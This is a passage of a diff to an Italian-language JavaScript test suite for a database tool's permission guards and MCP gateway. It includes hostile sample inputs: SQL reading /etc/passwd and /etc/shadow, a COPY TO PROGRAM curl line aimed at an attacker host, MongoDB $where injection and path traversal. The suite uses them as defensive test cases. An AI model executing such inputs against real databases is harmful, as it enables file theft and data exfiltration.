@@ -8,9 +8,18 @@
 const assert = require('assert');
 
 const { ROOT_PRINCIPAL, makePrincipal } = require('../auth/principal');
-const { eventCapability, matchesAny } = require('../auth/capabilities');
+const {
+  eventCapability, matchesAny, analyzeSql, sqlCapability,
+  isWriteMongoPipeline, analyzeMongoPipeline, assertNoMongoServerJs,
+} = require('../auth/capabilities');
 const { can, allowedConnections, canUseConnection, canWholeConnection } = require('../auth/permissions');
-const { guardStrategy } = require('../auth/guardStrategy');
+const { guardStrategy, scopeEffettivamenteLimitato } = require('../auth/guardStrategy');
+const {
+  assertReadOnlySql, assertWriteSql, assertReadOnlyPipeline,
+  refreshSessionPrincipal, refreshWritesAllowed,
+  credentialFingerprint, sameMcpIdentity, backupVerificationPayload,
+  resolveBackupSelection, hasTopLevelSqlKeyword,
+} = require('../mcp/McpGateway');
 
 console.log('--- Test Unitari RBAC ---');
 
@@ -27,10 +36,184 @@ assert.strictEqual(eventCapability('mongo:disconnect', {}, null), null, 'eventi 
 const sqlSess = { strategy: { type: 'mysql' } };
 const mongoSess = { strategy: { type: 'mongodb' } };
 assert.strictEqual(eventCapability('collection:aggregate', { pipeline: 'SELECT 1' }, sqlSess), 'read');
-assert.strictEqual(eventCapability('collection:aggregate', { pipeline: 'DELETE FROM t' }, sqlSess), 'write');
+assert.strictEqual(eventCapability('collection:aggregate', { pipeline: 'DELETE FROM t' }, sqlSess), 'delete');
+assert.strictEqual(eventCapability('collection:aggregate', { pipeline: 'DROP TABLE t' }, sqlSess), 'ddl');
+assert.strictEqual(eventCapability('collection:aggregate', { pipeline: "SELECT pg_read_file('/etc/passwd')" }, sqlSess), 'write');
 assert.strictEqual(eventCapability('collection:aggregate', { pipeline: '[{"$match":{}}]' }, mongoSess), 'read');
 assert.strictEqual(eventCapability('collection:aggregate', { pipeline: '[{"$out":"copia"}]' }, mongoSess), 'write');
+assert.strictEqual(eventCapability('collection:aggregate', { pipeline: '[{"\\u0024out":"copia"}]' }, mongoSess), 'write');
 console.log('  OK   Classificazione eventi → capability');
+
+/* --- Analisi strutturata SQL e MongoDB -------------------------------------- */
+
+assert.deepStrictEqual(analyzeSql('SELECT 1').capabilities, ['read']);
+assert.deepStrictEqual(
+  analyzeSql('UPDATE t SET x = 1 RETURNING segreto').capabilities,
+  ['read', 'write'],
+  'SQL Raw mutativo richiede sempre anche read',
+);
+assert.deepStrictEqual(
+  analyzeSql('DELETE FROM t WHERE id = 1 RETURNING segreto').capabilities,
+  ['read', 'delete'],
+);
+assert.deepStrictEqual(
+  analyzeSql('CREATE TABLE copia AS SELECT * FROM segreti').capabilities,
+  ['read', 'ddl'],
+);
+assert.strictEqual(sqlCapability('INSERT INTO t (x) VALUES (1)'), 'write');
+assert.strictEqual(sqlCapability('DELETE FROM t WHERE id = 1'), 'delete');
+assert.strictEqual(sqlCapability('DROP TABLE t'), 'ddl');
+assert.strictEqual(sqlCapability('WITH eliminati AS (DELETE FROM t RETURNING *) SELECT * FROM eliminati'), 'delete');
+const sqlMultiplo = analyzeSql('SELECT 1; DROP TABLE utenti');
+assert.strictEqual(sqlMultiplo.multipleStatements, true);
+assert.deepStrictEqual(sqlMultiplo.capabilities, ['read', 'ddl']);
+assert.strictEqual(sqlCapability('BEGIN'), 'ddl', 'statement ignoto: classificazione conservativa');
+const commentoEseguibile = analyzeSql('/*!50000 DELETE FROM utenti */');
+assert.strictEqual(commentoEseguibile.executableComment, true);
+assert.strictEqual(commentoEseguibile.write, true);
+assert.strictEqual(commentoEseguibile.capability, 'ddl');
+assert.strictEqual(analyzeSql('/*m!100100 DROP TABLE utenti */').executableComment, true,
+  'il marker MariaDB è riconosciuto senza dipendere dalle maiuscole');
+assert.strictEqual(analyzeSql('/* commento normale: DELETE FROM utenti */ SELECT 1').executableComment, false);
+
+assert.strictEqual(isWriteMongoPipeline('[{"\\u0024out":"copia"}]'), true,
+  'la chiave $out offuscata come escape JSON viene decodificata prima del controllo');
+assert.deepStrictEqual(
+  analyzeMongoPipeline('[{"$merge":{"into":{"db":"archivio","coll":"ordini"}}}]').targets,
+  [{ db: 'archivio', coll: 'ordini', operator: '$merge' }],
+);
+assert.deepStrictEqual(
+  analyzeMongoPipeline(
+    '[{"$facet":{"ramo":[{"$lookup":{"from":"clienti","pipeline":[{"$unionWith":"audit"}],"as":"c"}}]}},'
+    + '{"$graphLookup":{"from":"categorie","startWith":"$categoria","connectFromField":"parent","connectToField":"_id","as":"g"}}]'
+  ).readTargets,
+  [
+    { db: null, coll: 'clienti', operator: '$lookup' },
+    { db: null, coll: 'audit', operator: '$unionWith' },
+    { db: null, coll: 'categorie', operator: '$graphLookup' },
+  ],
+  'le sorgenti lette sono estratte anche dalle pipeline annidate',
+);
+assert.throws(() => assertNoMongoServerJs('{"\\u0024where":"return true"}'), /\$where/);
+assert.throws(() => assertNoMongoServerJs('[{"$project":{"x":{"\\u0024function":{"body":"x","args":[],"lang":"js"}}}}]'), /\$function/);
+assert.throws(() => assertNoMongoServerJs('[{"$group":{"x":{"$accumulator":{"init":"x"}}}}]'), /\$accumulator/);
+assert.doesNotThrow(() => assertNoMongoServerJs('[{"$match":{"$expr":{"$eq":["$a",1]}}}]'));
+console.log('  OK   Analisi SQL/MongoDB strutturata e fail-closed');
+
+/* --- Barriere locali del gateway MCP --------------------------------------- */
+
+assert.doesNotThrow(() => assertReadOnlySql('SELECT 1'));
+assert.throws(() => assertReadOnlySql('SELECT 1; DROP TABLE utenti'), /un solo statement/);
+assert.throws(() => assertReadOnlySql("SELECT pg_read_file('/etc/passwd')"), /I\/O su file/);
+assert.throws(() => assertReadOnlySql('INSERT INTO t (x) VALUES (1)'), /solo query di lettura/);
+assert.strictEqual(assertWriteSql('INSERT INTO t (x) VALUES (1)'), 'write');
+assert.strictEqual(assertWriteSql('DELETE FROM t WHERE id = 1'), 'delete');
+assert.throws(
+  () => assertWriteSql("INSERT INTO copie (contenuto) SELECT LOAD_FILE('/etc/passwd')"),
+  /non ammette l'I\/O su file/,
+);
+assert.throws(
+  () => assertWriteSql("UPDATE copie SET contenuto = pg_read_file('/etc/passwd') WHERE id = 1"),
+  /non ammette l'I\/O su file/,
+);
+assert.throws(() => assertWriteSql("DELETE FROM t RETURNING 'where'"), /senza clausola WHERE/);
+assert.throws(() => assertWriteSql('DELETE FROM t /* WHERE id = 1 */'), /senza clausola WHERE/);
+assert.throws(
+  () => assertWriteSql('UPDATE t SET x = (SELECT max(y) FROM s WHERE s.id = t.id)'),
+  /senza clausola WHERE/,
+  'un WHERE dentro una sottoquery non limita le righe aggiornate',
+);
+assert.throws(
+  () => assertWriteSql('DELETE FROM t USING (SELECT id FROM s WHERE attivo = 0) x'),
+  /senza clausola WHERE/,
+  'un WHERE dentro la sorgente USING non limita le righe cancellate',
+);
+assert.doesNotThrow(
+  () => assertWriteSql('UPDATE t SET x = (SELECT max(y) FROM s WHERE s.id = t.id) WHERE t.id = 1'),
+);
+assert.doesNotThrow(
+  () => assertWriteSql('DELETE FROM t WHERE id IN (SELECT id FROM s WHERE attivo = 0)'),
+);
+assert.strictEqual(hasTopLevelSqlKeyword('UPDATE t SET x = (SELECT 1 WHERE ok = 1)', 'where'), false);
+assert.strictEqual(hasTopLevelSqlKeyword('UPDATE t SET x = (SELECT 1) WHERE id = 1', 'where'), true);
+assert.strictEqual(hasTopLevelSqlKeyword('UPDATE t SET x = 1 WHERE id = (1', 'where'), false,
+  'parentesi sbilanciate restano fail-closed anche dopo un WHERE top-level');
+assert.throws(() => assertWriteSql('DROP TABLE t'), /niente DDL/);
+assert.throws(() => assertWriteSql('UPDATE t SET x = 1; DELETE FROM t WHERE id = 1'), /un solo statement/);
+assert.doesNotThrow(() => assertReadOnlyPipeline('[{"$match":{"attivo":true}}]'));
+assert.throws(() => assertReadOnlyPipeline('[{"\\u0024out":"copia"}]'), /\$out e \$merge/);
+assert.throws(
+  () => assertReadOnlyPipeline('[{"$project":{"x":{"\\u0024function":{"body":"x","args":[],"lang":"js"}}}}]'),
+  /\$function/,
+);
+console.log('  OK   Gateway MCP: SQL singolo, DML granulare e pipeline senza JavaScript');
+
+const readOnlyLive = { prod: { readOnly: 'false' } };
+const liveDbSession = { name: 'prod', writesAllowed: false };
+const liveMcpSession = { principal: ROOT_PRINCIPAL };
+const liveDeps = { loadConnections: () => readOnlyLive };
+assert.strictEqual(refreshWritesAllowed(liveMcpSession, liveDbSession, liveDeps), true);
+readOnlyLive.prod.readOnly = false;
+assert.strictEqual(refreshWritesAllowed(liveMcpSession, liveDbSession, liveDeps), true,
+  'anche il valore booleano false abilita esplicitamente la scrittura');
+readOnlyLive.prod.readOnly = 'true';
+assert.strictEqual(refreshWritesAllowed(liveMcpSession, liveDbSession, liveDeps), false,
+  'la revoca readOnly diventa effettiva senza riaprire la connessione MCP');
+assert.strictEqual(liveDbSession.writesAllowed, false);
+delete readOnlyLive.prod;
+assert.strictEqual(refreshWritesAllowed(liveMcpSession, liveDbSession, liveDeps), false,
+  'una connessione salvata rimossa ricade in sola lettura');
+console.log('  OK   MCP: flag readOnly riletto a ogni operazione distruttiva');
+
+const sameSubjectRestricted = makePrincipal(
+  { _id: 'same-subject', type: 'subuser', ownerId: 'o1' },
+  [{ connName: 'prod', capabilities: ['read'], scope: null }],
+  ['prod'],
+);
+const sameSubjectBroad = makePrincipal(
+  { _id: 'same-subject', type: 'subuser', ownerId: 'o1' },
+  [{ connName: 'prod', capabilities: ['read'], scope: null }],
+  null,
+);
+const restrictedFingerprint = credentialFingerprint('cdb_key_restricted');
+const broadFingerprint = credentialFingerprint('cdb_key_broad');
+const identitySession = { principal: sameSubjectRestricted, credentialFingerprint: restrictedFingerprint };
+assert.strictEqual(sameMcpIdentity(identitySession, sameSubjectRestricted, credentialFingerprint('cdb_key_restricted')), true);
+assert.strictEqual(sameMcpIdentity(identitySession, sameSubjectBroad, broadFingerprint), false,
+  'due API key dello stesso subject ma con connScope diversi non condividono la sessione MCP');
+assert.strictEqual(sameMcpIdentity(identitySession, sameSubjectBroad, restrictedFingerprint), true,
+  'la stessa credenziale può ricevere il principal rivalidato dello stesso subject');
+console.log('  OK   Sessione MCP vincolata anche alla credenziale, non soltanto al subject');
+
+const verificaPayload = backupVerificationPayload({
+  backupId: 'backup-1',
+  okCount: 1,
+  failedCount: 2,
+  unverifiableCount: 1,
+  extraCount: 1,
+  valid: false,
+  details: [
+    { file: 'ok.ndjson', status: 'OK' },
+    { file: 'missing.ndjson', status: 'MISSING' },
+    { file: 'mismatch.ndjson', status: 'CORRUPTED' },
+    { file: 'legacy.ndjson', status: 'UNVERIFIABLE' },
+    { file: 'extra.ndjson', status: 'UNDECLARED' },
+  ],
+});
+assert.deepStrictEqual(Object.keys(verificaPayload.categories), ['missing', 'mismatch', 'unverifiable', 'extra']);
+assert.strictEqual(verificaPayload.missing_files, 1);
+assert.strictEqual(verificaPayload.mismatched_files, 1);
+assert.strictEqual(verificaPayload.unverifiable_files, 1);
+assert.strictEqual(verificaPayload.extra_files, 1);
+assert.strictEqual(verificaPayload.valid, false);
+console.log('  OK   MCP: verifica backup condivisa con categorie di integrità esplicite');
+
+const backupScelto = resolveBackupSelection('C:\\backup-tenant', 'gruppo_1', '20260814_full');
+assert.ok(backupScelto.backupDir.endsWith(require('path').join('gruppo_1', '20260814_full')));
+assert.throws(() => resolveBackupSelection('C:\\backup-tenant', '..', '20260814_full'), /non validi/);
+assert.throws(() => resolveBackupSelection('C:\\backup-tenant', 'gruppo_1', '..'), /non validi/);
+assert.throws(() => resolveBackupSelection('C:\\backup-tenant', 'C:', '20260814_full'), /non validi/);
+console.log('  OK   MCP: selezione backup confinata nella radice del tenant');
 
 /* --- Match glob dello scope --------------------------------------------------- */
 
@@ -40,6 +223,19 @@ assert.ok(matchesAny(['*'], 'qualsiasi'));
 assert.ok(matchesAny([], 'senza limiti'), 'lista vuota = nessun limite');
 assert.ok(matchesAny(['a', 'b*'], 'bravo'));
 assert.ok(!matchesAny(['Orders*'], 'orders'), 'il match è case-sensitive');
+assert.strictEqual(scopeEffettivamenteLimitato(null), false);
+assert.strictEqual(scopeEffettivamenteLimitato({}), false);
+assert.strictEqual(scopeEffettivamenteLimitato({ databases: [], collections: [] }), false);
+assert.strictEqual(
+  scopeEffettivamenteLimitato({ databases: ['shop', '*'], collections: ['ordini', '*'] }),
+  false,
+  'la presenza di * rende davvero illimitata la dimensione',
+);
+assert.strictEqual(
+  scopeEffettivamenteLimitato({ databases: ['shop'], collections: ['*'] }),
+  true,
+  'basta una dimensione limitata per attivare la barriera',
+);
 console.log('  OK   Match glob dello scope');
 
 /* --- Decisione dei permessi --------------------------------------------------- */
@@ -92,11 +288,24 @@ function fakeStrategy() {
     async dbSchema() {
       return {
         collections: [{ name: 'orders' }, { name: 'customers' }],
-        relations: [{ from: 'orders', to: 'customers' }],
+        relations: [
+          { from: 'orders', to: 'customers' },
+          { from: 'orders', to: 'orders', db: 'altro' },
+        ],
       };
     },
     async search() { return [{ name: 'shop', collections: [{ name: 'orders' }, { name: 'customers' }] }]; },
     async collectionFind(db, coll) { calls.push(['find', db, coll]); return { docs: [] }; },
+    async collectionCount(db, coll) { calls.push(['count', db, coll]); return { total: 0 }; },
+    async collectionExplain(db, coll) { calls.push(['explain', db, coll]); return { plan: {} }; },
+    async columnRelations() {
+      return [
+        { campo: 'archive_id', db: 'shop', tabella: 'orders_archive', colonna: '_id' },
+        { campo: 'customer_id', db: 'shop', tabella: 'customers', colonna: '_id' },
+        { campo: 'remote_id', db: 'altro', tabella: 'orders_remote', colonna: '_id' },
+      ];
+    },
+    async relatedRows(db, coll) { calls.push(['relatedRows', db, coll]); return { righe: [] }; },
     async docInsert(db, coll) { calls.push(['insert', db, coll]); return { inserted: 1 }; },
     async renameCollection(db, coll, newName) { calls.push(['rename', db, coll, newName]); return {}; },
     async collectionAggregate(db, coll, payload) { calls.push(['aggregate', payload.pipeline]); return { docs: [] }; },
@@ -108,7 +317,11 @@ function fakeStrategy() {
 (async () => {
   const raw = fakeStrategy();
   assert.strictEqual(guardStrategy(raw, null), raw, 'senza contesto la strategia non viene avvolta');
-  assert.strictEqual(guardStrategy(raw, { principal: ROOT_PRINCIPAL }), raw, 'root: nessun Proxy, zero overhead');
+  assert.notStrictEqual(
+    guardStrategy(raw, { principal: ROOT_PRINCIPAL }),
+    raw,
+    'anche root attraversa le invarianti MongoDB, pur mantenendo tutti i permessi',
+  );
 
   const guarded = guardStrategy(fakeStrategy(), { principal: viewer, connName: 'prod' });
 
@@ -130,6 +343,11 @@ function fakeStrategy() {
   assert.deepStrictEqual(schema.relations, [], 'relazioni verso collezioni nascoste rimosse');
   const found = await guarded.search('o');
   assert.deepStrictEqual(found[0].collections, [{ name: 'orders' }], 'search filtrata');
+  assert.deepStrictEqual(
+    await guarded.columnRelations('shop', 'orders'),
+    [{ campo: 'archive_id', db: 'shop', tabella: 'orders_archive', colonna: '_id' }],
+    'i metadati delle relazioni non rivelano target fuori scope',
+  );
 
   // La destinazione di una rename deve rientrare nello scope quanto l'origine.
   const guardedAdmin = guardStrategy(fakeStrategy(), {
@@ -150,6 +368,149 @@ function fakeStrategy() {
   await guardedViewerAgg.collectionAggregate('shop', 'orders', { pipeline: '[{"$match":{}}]' });
   await assert.rejects(() => guardedViewerAgg.collectionAggregate('shop', 'orders', { pipeline: '[{"$out":"copia"}]' }),
     /Permesso negato/, 'pipeline di scrittura negata al viewer');
+  await assert.rejects(() => guardedViewerAgg.collectionAggregate('shop', 'orders', { pipeline: '[{"\\u0024out":"copia"}]' }),
+    /Permesso negato/, 'anche $out codificato come escape JSON viene riconosciuto');
+
+  await guardedViewerAgg.collectionAggregate('shop', 'orders', {
+    pipeline: '[{"$lookup":{"from":"orders_archive","localField":"x","foreignField":"x","as":"a"}}]',
+  });
+  await assert.rejects(
+    () => guardedViewerAgg.collectionAggregate('shop', 'orders', {
+      pipeline: '[{"$lookup":{"from":"customers","localField":"x","foreignField":"x","as":"c"}}]',
+    }),
+    /Permesso negato.*customers/,
+    '$lookup non legge una collection fuori scope',
+  );
+  await assert.rejects(
+    () => guardedViewerAgg.collectionAggregate('shop', 'orders', {
+      pipeline: '[{"$graphLookup":{"from":"customers","startWith":"$x","connectFromField":"x","connectToField":"x","as":"c"}}]',
+    }),
+    /Permesso negato.*customers/,
+    '$graphLookup applica lo scope alla sorgente',
+  );
+  await assert.rejects(
+    () => guardedViewerAgg.collectionAggregate('shop', 'orders', {
+      pipeline: '[{"$facet":{"ramo":[{"$unionWith":{"coll":"customers","pipeline":[]}}]}}]',
+    }),
+    /Permesso negato.*customers/,
+    '$unionWith annidato in $facet non scavalca lo scope',
+  );
+
+  const mongoSoloWrite = guardStrategy(fakeStrategy(), {
+    principal: makePrincipal(
+      { _id: 'mongo-write-only', type: 'subuser', ownerId: 'o1' },
+      [{ connName: 'prod', role: 'custom', capabilities: ['write'], scope: null }],
+    ),
+    connName: 'prod',
+  });
+  await assert.rejects(
+    () => mongoSoloWrite.collectionAggregate('shop', 'orders', { pipeline: '[{"$merge":"copia"}]' }),
+    /Permesso negato.*lettura/,
+    '$merge richiede read sulla sorgente oltre a write',
+  );
+
+  // $out/$merge devono essere autorizzati anche sul BERSAGLIO, che può avere
+  // collection e database diversi da quelli dichiarati nel payload socket.
+  const mongoWriterConScope = guardStrategy(fakeStrategy(), {
+    principal: makePrincipal(
+      { _id: 'u5', type: 'subuser', ownerId: 'o1', email: 'mw@x.it' },
+      [{ connName: 'prod', role: 'editor', capabilities: ['read', 'write'], scope: { databases: ['shop'], collections: ['orders*'] } }],
+    ),
+    connName: 'prod',
+  });
+  await mongoWriterConScope.collectionAggregate('shop', 'orders', { pipeline: '[{"$merge":"orders_archivio"}]' });
+  await assert.rejects(
+    () => mongoWriterConScope.collectionAggregate('shop', 'orders', { pipeline: '[{"$out":"orders_archivio"}]' }),
+    /Permesso negato.*cancellazione/,
+    '$out sostituisce la destinazione e richiede anche delete',
+  );
+
+  const mongoOutWriter = guardStrategy(fakeStrategy(), {
+    principal: makePrincipal(
+      { _id: 'u6', type: 'subuser', ownerId: 'o1', email: 'mout@x.it' },
+      [{ connName: 'prod', role: 'custom', capabilities: ['read', 'write', 'delete'], scope: { databases: ['shop'], collections: ['orders*'] } }],
+    ),
+    connName: 'prod',
+  });
+  await mongoOutWriter.collectionAggregate('shop', 'orders', { pipeline: '[{"$out":"orders_archivio"}]' });
+  await assert.rejects(
+    () => mongoOutWriter.collectionAggregate('shop', 'orders', { pipeline: '[{"$out":"clienti"}]' }),
+    /Permesso negato/,
+    '$out verso una collection fuori scope viene negato',
+  );
+  await assert.rejects(
+    () => mongoWriterConScope.collectionAggregate('shop', 'orders', {
+      pipeline: '[{"$merge":{"into":{"db":"altro","coll":"orders"}}}]',
+    }),
+    /Permesso negato/,
+    '$merge verso un database fuori scope viene negato',
+  );
+
+  // Queste primitive eseguono JavaScript nel processo MongoDB e restano
+  // vietate anche al principal root: sono invarianti di sicurezza, non grant.
+  const guardedRoot = guardStrategy(fakeStrategy(), { principal: ROOT_PRINCIPAL, connName: 'prod' });
+  await assert.rejects(
+    () => guardedRoot.collectionFind('shop', 'orders', { filter: '{"$where":"return true"}' }),
+    /JavaScript lato server/,
+  );
+  await assert.rejects(
+    () => guardedRoot.collectionAggregate('shop', 'orders', {
+      pipeline: '[{"$project":{"x":{"$function":{"body":"x","args":[],"lang":"js"}}}}]',
+    }),
+    /JavaScript lato server/,
+  );
+  await assert.rejects(
+    () => guardedRoot.collectionExplain('shop', 'orders', {
+      mode: 'aggregate',
+      pipeline: '[{"$group":{"_id":null,"x":{"$accumulator":{"init":"x"}}}}]',
+    }),
+    /JavaScript lato server/,
+  );
+  await assert.rejects(
+    () => guardedRoot.collectionExplain('shop', 'orders', { mode: 'aggregate', pipeline: '[{"$out":"copia"}]' }),
+    /non sono consentiti nel piano/,
+  );
+  await assert.doesNotReject(
+    () => guardedRoot.collectionFind('shop', 'orders', { filter: '{"$expr":{"$eq":["$a",1]}}' }),
+  );
+  await assert.rejects(
+    () => guardedRoot.relatedRows('shop', 'orders', { colonna: '$where', valore: 'return true' }),
+    /Colonna di riferimento MongoDB: percorso non valido/,
+    'relation:rows non può trasformare il nome colonna in un operatore MongoDB',
+  );
+  await assert.rejects(
+    () => guardedRoot.relatedRows('shop', 'orders', { colonna: 'profilo.$expr', valore: 1 }),
+    /Colonna di riferimento MongoDB: percorso non valido/,
+  );
+  await assert.rejects(
+    () => guardedRoot.relatedRows('shop', 'orders', { colonna: 'profilo\0nome', valore: 1 }),
+    /Colonna di riferimento MongoDB: percorso non valido/,
+  );
+  await assert.rejects(
+    () => guardedRoot.relatedRows('shop', 'orders', { colonna: '_id', valore: { $where: 'return true' } }),
+    /JavaScript lato server/,
+  );
+  await assert.doesNotReject(
+    () => guardedRoot.relatedRows('shop', 'orders', { colonna: 'cliente._id', valore: 42 }),
+  );
+
+  // Il contesto è mutabile: la revoca a caldo sostituisce il principal e il
+  // Proxy deve usare quello nuovo già dalla chiamata successiva.
+  const dynamicCtx = { principal: editor, connName: 'prod' };
+  const dynamicGuard = guardStrategy(fakeStrategy(), dynamicCtx);
+  const dynamicMcpSession = {
+    principal: editor,
+    dbSessions: new Map([['conn-1', { guardCtx: dynamicCtx }]]),
+  };
+  await dynamicGuard.docInsert('shop', 'orders', {});
+  refreshSessionPrincipal(dynamicMcpSession, viewer);
+  assert.strictEqual(dynamicMcpSession.principal, viewer, 'anche il principal della sessione MCP viene aggiornato');
+  assert.strictEqual(dynamicCtx.principal, viewer, 'il nuovo principal raggiunge il guardCtx della connessione aperta');
+  await assert.rejects(() => dynamicGuard.docInsert('shop', 'orders', {}), /Permesso negato/,
+    'la revoca della capability write viene applicata senza riaprire la sessione');
+  await dynamicGuard.collectionFind('shop', 'orders', {});
+  dynamicCtx.principal = null;
+  await assert.rejects(() => dynamicGuard.collectionFind('shop', 'orders', {}), /Sessione non più autorizzata/);
   console.log('  OK   Proxy autorizzante sulle strategie');
 
   /* --- Scritture da SCRIPT (shellWrite) -------------------------------------- */
@@ -167,8 +528,50 @@ function fakeStrategy() {
     const editorScript = guardStrategy(fakeStrategy(), { principal: editor, connName: 'prod' });
     await editorScript.shellWrite('shop', 'orders', { op: 'insertOne', doc: '{}' });
     await editorScript.shellWrite('shop', 'orders', { op: 'updateMany', filter: '{}', update: '{"$set":{}}' });
+    await editorScript.shellWrite('shop', 'orders', {
+      op: 'findOneAndUpdate', filter: '{"_id":1}', update: '{"$set":{"x":1}}',
+    });
     await assert.rejects(() => editorScript.shellWrite('shop', 'orders', { op: 'deleteMany', filter: '{}' }),
       /Permesso negato/, 'deleteMany da script negato a chi non ha la capability delete');
+
+    const soloWriteScript = guardStrategy(fakeStrategy(), {
+      principal: makePrincipal(
+        { _id: 'script-write-only', type: 'subuser', ownerId: 'o1' },
+        [{ connName: 'prod', role: 'custom', capabilities: ['write'], scope: null }],
+      ),
+      connName: 'prod',
+    });
+    await assert.rejects(
+      () => soloWriteScript.shellWrite('shop', 'orders', {
+        op: 'findOneAndUpdate', filter: '{"_id":1}', update: '{"$set":{"x":1}}',
+      }),
+      /Permesso negato.*lettura/,
+      'findOneAndUpdate restituisce il documento e richiede anche read',
+    );
+    const soloDeleteScript = guardStrategy(fakeStrategy(), {
+      principal: makePrincipal(
+        { _id: 'script-delete-only', type: 'subuser', ownerId: 'o1' },
+        [{ connName: 'prod', role: 'custom', capabilities: ['delete'], scope: null }],
+      ),
+      connName: 'prod',
+    });
+    await assert.rejects(
+      () => soloDeleteScript.shellWrite('shop', 'orders', {
+        op: 'findOneAndDelete', filter: '{"_id":1}',
+      }),
+      /Permesso negato.*lettura/,
+      'findOneAndDelete richiede read oltre a delete',
+    );
+    const readDeleteScript = guardStrategy(fakeStrategy(), {
+      principal: makePrincipal(
+        { _id: 'script-read-delete', type: 'subuser', ownerId: 'o1' },
+        [{ connName: 'prod', role: 'custom', capabilities: ['read', 'delete'], scope: null }],
+      ),
+      connName: 'prod',
+    });
+    await readDeleteScript.shellWrite('shop', 'orders', {
+      op: 'findOneAndDelete', filter: '{"_id":1}',
+    });
 
     // Lo scope vale come per le altre operazioni: fuori perimetro si nega.
     // (`editor` qui sopra non ha scope, quindi serve un principal che ce l'ha.)
@@ -265,6 +668,8 @@ function fakeStrategy() {
       'GRANT ALL PRIVILEGES ON *.* TO evil',
       'TRUNCATE clienti',
       'CALL procedura()',
+      '/*!50000 DELETE FROM utenti */',
+      '/*M! DROP TABLE utenti */',
     ];
     for (const q of scritture) {
       assert.strictEqual(isWriteSql(q), true, `scrittura da riconoscere: ${q}`);
@@ -284,8 +689,15 @@ function fakeStrategy() {
       "SELECT * FROM t INTO   OUTFILE '/tmp/x'",
       "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
       "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t",
+      "LOAD XML LOCAL INFILE '/etc/passwd' INTO TABLE t",
       "SELECT LOAD_FILE('/etc/shadow')",
       "SELECT load_file ('/etc/shadow')",
+      "SELECT pg_read_file('/etc/passwd')",
+      "SELECT pg_catalog.pg_read_binary_file('/etc/passwd')",
+      `SELECT "pg_catalog"."pg_read_file"('/etc/passwd')`,
+      "SELECT lo_export(42, '/tmp/oggetto')",
+      "COPY clienti TO '/tmp/clienti.csv'",
+      "COPY clienti TO PROGRAM 'curl https://attacker.invalid'",
     ];
     for (const q of suFile) {
       assert.strictEqual(isFileIoSql(q), true, `I/O su file da riconoscere: ${q}`);
@@ -298,6 +710,11 @@ function fakeStrategy() {
       "SELECT * FROM log WHERE msg = 'INTO OUTFILE /tmp/x'",
       'SELECT * FROM t -- INTO OUTFILE /tmp/x',
       'SELECT infile_path, outfile_path FROM configurazioni',
+      "SELECT * FROM log WHERE msg = 'pg_read_file(/etc/passwd)'",
+      "SELECT * FROM log WHERE msg = 'LOAD XML INFILE /etc/passwd'",
+      'SELECT * FROM t -- COPY clienti TO /tmp/x',
+      'SELECT * FROM t /* LOAD XML INFILE /etc/passwd */',
+      'SELECT copy FROM configurazioni',
       'SELECT * FROM caricamenti WHERE tipo = 1',
       'INSERT INTO clienti (nome) VALUES (1)',
     ];
@@ -334,6 +751,26 @@ function fakeStrategy() {
     await assert.doesNotReject(
       () => g.collectionFind('db', 't', { filter: 'eta > 30' }),
       'un filtro normale continua a funzionare',
+    );
+
+    const rawPg = {
+      type: 'postgresql',
+      async collectionAggregate() { return { docs: [], columns: [], total: 0 }; },
+    };
+    const pgPowerUser = makePrincipal(
+      { _id: 'u-pg', ownerId: 'o1', type: 'subuser' },
+      [{ connName: 'c', role: 'admin', capabilities: ['read', 'write', 'delete', 'ddl'], scope: null }],
+    );
+    const gPg = guardStrategy(rawPg, { principal: pgPowerUser, connName: 'c' });
+    await assert.rejects(
+      () => gPg.collectionAggregate('public', null, { pipeline: "SELECT pg_read_file('/etc/passwd')" }),
+      /file sul server del database/,
+      'le funzioni file PostgreSQL sono negate anche a un sottoutente con tutte le capability dati',
+    );
+    await assert.rejects(
+      () => gPg.collectionAggregate('public', null, { pipeline: "COPY clienti TO '/tmp/clienti.csv'" }),
+      /file sul server del database/,
+      'COPY PostgreSQL non può accedere al filesystem dell\'host',
     );
 
     // L'owner resta libero (stessa scelta di expectRead): sulla propria
@@ -380,7 +817,7 @@ function fakeStrategy() {
 
     seen.length = 0;
     await guardStrategy(pgStrategy(), { principal: sub, connName: 'prod' })
-      .collectionAggregate('public', null, { pipeline: 'DELETE FROM t' });
+      .collectionAggregate('public', null, { pipeline: 'UPDATE t SET x = 1' });
     assert.ok(!seen[0].expectRead, 'scrittura riconosciuta: nessuna transazione di sola lettura');
 
     seen.length = 0;
@@ -388,6 +825,104 @@ function fakeStrategy() {
       .collectionAggregate('public', null, { pipeline: 'SELECT elabora_ordini()' });
     assert.ok(!seen[0].expectRead, 'owner: comportamento invariato (funzioni con effetti collaterali, temp table, SET)');
     console.log('  OK   Barriera READ ONLY per i sottoutenti, owner invariato (CDB-02)');
+  }
+
+  /* --- Capability SQL granulari e statement singolo ----------------------- */
+  {
+    const eseguite = [];
+    const pgStrategy = () => ({
+      type: 'postgresql',
+      async collectionAggregate(_db, _coll, payload) { eseguite.push(payload.pipeline); return { docs: [] }; },
+    });
+    const deleteUser = makePrincipal(
+      { _id: 'sql-delete', type: 'subuser', ownerId: 'o1' },
+      [{ connName: 'prod', role: 'custom', capabilities: ['read', 'delete'], scope: null }],
+    );
+    const ddlUser = makePrincipal(
+      { _id: 'sql-ddl', type: 'subuser', ownerId: 'o1' },
+      [{ connName: 'prod', role: 'custom', capabilities: ['read', 'ddl'], scope: null }],
+    );
+    const writeOnlyUser = makePrincipal(
+      { _id: 'sql-write-only', type: 'subuser', ownerId: 'o1' },
+      [{ connName: 'prod', role: 'custom', capabilities: ['write'], scope: null }],
+    );
+    const deleteOnlyUser = makePrincipal(
+      { _id: 'sql-delete-only', type: 'subuser', ownerId: 'o1' },
+      [{ connName: 'prod', role: 'custom', capabilities: ['delete'], scope: null }],
+    );
+    const ddlOnlyUser = makePrincipal(
+      { _id: 'sql-ddl-only', type: 'subuser', ownerId: 'o1' },
+      [{ connName: 'prod', role: 'custom', capabilities: ['ddl'], scope: null }],
+    );
+
+    const editorSql = guardStrategy(pgStrategy(), { principal: editor, connName: 'prod' });
+    await editorSql.collectionAggregate('public', null, { pipeline: 'UPDATE clienti SET attivo = 1' });
+    await assert.rejects(
+      () => editorSql.collectionAggregate('public', null, { pipeline: 'DELETE FROM clienti WHERE id = 1' }),
+      /Permesso negato.*cancellazione/,
+      'read+write non include implicitamente delete',
+    );
+    await assert.rejects(
+      () => editorSql.collectionAggregate('public', null, { pipeline: 'DROP TABLE clienti' }),
